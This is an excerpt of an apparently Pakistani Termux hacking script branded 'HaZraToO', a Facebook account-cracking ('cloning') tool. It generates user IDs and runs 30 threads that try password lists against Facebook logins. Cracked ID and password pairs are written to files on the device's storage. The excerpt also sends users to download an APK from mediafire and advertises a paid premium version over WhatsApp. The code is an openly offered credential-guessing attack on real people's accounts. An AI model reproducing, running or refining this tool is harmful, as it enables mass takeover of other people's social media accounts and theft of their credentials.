...
logo=("""\033[1;37m
_                         _       _
    | | __ ___      ____ _  __| |     | | __ _ _ __
 _  | |/ _` \ \ /\ / / _` |/ _` |  _  | |/ _` | '_ \
| |_| | (_| |\ V  V / (_| | (_| | | |_| | (_| | | | |
 \___/ \__,_| \_/\_/ \__,_|\__,_|  \___/ \__,_|_| |_|
---------------------------------------------- 
 HACKING IS LIFE?
 WhatsApp  : 0729527432
 Tool Name : FREE.CLONING
 Type type : FREE
 Version   : 0.1.3
----------------------------------------------
...
def public():
        ...
        try:
                ...
                try:
                        ...
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last,firtslast,first123,khan123)
                linex()
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/HaZraToO_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi HaZraToO Sir, I Need To Buy Your Paid HaZraToO PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python HaZraToO.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as HaZraToO:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                HaZraToO.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [HaZraToO-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        HaZraToO=session.cookies.get_dict().keys()
                        if "c_user" in HaZraToO:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [HaZraToO-OK] %s | %s'%(ids,pas))
                                open('/sdcard/HaZraToO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in HaZraToO:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [HaZraToO-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HaZraToO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [HaZraToO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HaZraToO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/HaZraToO-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [HaZraToO-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/HaZraToO-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Jawad-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/jawad-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
